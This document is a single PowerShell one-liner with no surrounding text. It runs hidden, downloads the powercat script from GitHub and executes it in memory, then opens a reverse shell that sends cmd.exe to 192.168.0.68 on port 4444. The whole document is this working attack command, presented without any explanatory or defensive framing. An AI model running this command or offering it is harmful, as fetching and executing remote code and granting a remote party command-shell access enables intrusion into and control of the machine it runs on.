powershell -NoP -NonI -W hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 192.168.0.68 -p 4444 -e cmd"
